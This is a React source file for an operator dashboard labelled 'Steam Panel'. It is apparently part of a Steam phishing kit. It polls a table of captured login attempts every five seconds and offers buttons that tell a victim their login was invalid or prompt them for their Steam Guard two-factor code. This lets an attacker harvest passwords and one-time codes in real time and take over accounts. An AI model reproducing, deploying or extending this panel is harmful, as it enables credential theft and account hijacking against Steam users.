
import React, { useState, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { RefreshCcw } from 'lucide-react';
import { toast } from 'sonner';
import AdminLogin from '@/components/AdminLogin';
import { supabase } from "@/integrations/supabase/client";
import LoginAttemptsTable from '@/components/LoginAttemptsTable';
import { LoginAttempt } from '@/types/loginAttempt';

const AdminPanel = () => {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [loginAttempts, setLoginAttempts] = useState<LoginAttempt[]>([]);
  const [isLoading, setIsLoading] = useState(true);

  // Fetch login attempts from Supabase
  const fetchLoginAttempts = async () => {
    setIsLoading(true);
    
    try {
      const { data, error } = await supabase
        .from('loginattempts')
        .select('*')
        .order('timestamp', { ascending: false });

      if (error) throw error;
      
      // Make sure we're correctly typing the data
      setLoginAttempts(data as LoginAttempt[]);
    } catch (error) {
      console.error('Error fetching login attempts:', error);
      toast.error('Failed to load data');
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    if (isAuthenticated) {
      fetchLoginAttempts();
      
      // Update data every 5 seconds
      const interval = setInterval(fetchLoginAttempts, 5000);
      
      return () => clearInterval(interval);
    }
  }, [isAuthenticated]);

  const handleRetryRequest = async (username: string) => {
    try {
      const { error } = await supabase
        .from('loginattempts')
        .update({ status: 'rejected' })
        .eq('username', username)
        .eq('status', 'pending');

      if (error) throw error;
      
      toast.success("Success: 'Invalid login' message sent to user");
      fetchLoginAttempts();
      
    } catch (error) {
      toast.error('Operation failed');
    }
  };

  const handleSteamGuardRequest = async (username: string) => {
    try {
      const { error } = await supabase
        .from('loginattempts')
        .update({ status: 'awaiting_2fa' })
        .eq('username', username)
        .eq('status', 'pending');

      if (error) throw error;
      
      toast.success("Success: Steam Guard code requested from user");
      fetchLoginAttempts();
      
    } catch (error) {
      toast.error('Operation failed');
    }
  };

  const handleIpBlock = async (ip: string) => {
    try {
      const { error } = await supabase
        .from('loginattempts')
        .update({ status: 'blocked' })
        .eq('ip', ip);

      if (error) throw error;
      
      toast.success(`IP Address successfully blocked: ${ip}`);
      fetchLoginAttempts();
      
    } catch (error) {
      toast.error('IP blocking operation failed');
    }
  };

  // If not authenticated, show login screen
  if (!isAuthenticated) {
    return <AdminLogin onLoginSuccess={() => setIsAuthenticated(true)} />;
  }

  return (
    <div className="container mx-auto p-6 max-w-6xl">
      <div className="flex justify-between items-center mb-6">
        <h1 className="text-2xl font-bold">Steam Panel</h1>
        <Button variant="outline" onClick={() => fetchLoginAttempts()}>
          <RefreshCcw className="mr-2 h-4 w-4" />
          Refresh
        </Button>
      </div>

      <div className="grid gap-4">
        <Card>
          <CardHeader>
            <CardTitle>Login Attempts</CardTitle>
          </CardHeader>
          <CardContent>
            <LoginAttemptsTable 
              loginAttempts={loginAttempts}
              isLoading={isLoading}
              onRetryRequest={handleRetryRequest}
              onSteamGuardRequest={handleSteamGuardRequest}
              onIpBlock={handleIpBlock}
            />
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

export default AdminPanel;
